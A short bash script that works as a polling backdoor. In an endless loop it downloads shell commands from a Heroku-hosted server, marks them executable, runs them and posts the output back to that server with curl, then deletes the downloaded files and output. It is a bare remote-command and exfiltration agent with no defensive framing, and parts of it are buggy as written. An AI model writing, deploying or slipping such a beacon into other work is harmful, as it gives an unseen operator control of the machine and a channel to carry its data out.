prevInstr="no way this would be repeated as the instruction"
while :
do
	echo "Polling"
	curl fierce-badlands-47784.herokuapp.com > instructions.sh
	instr=`cat instructions.sh`
	if [$instr != $prevInstr]; then
		prevInstr=$instr
		chmod +x instructions.sh
		instructions > answer
		value=`cat answer`
		curl --data "payload=$value" fierce-badlands-47784.herokuapp.com > resp
		rm resp
		rm answer
		rm instructions.sh
	fi
	sleep 5000
done
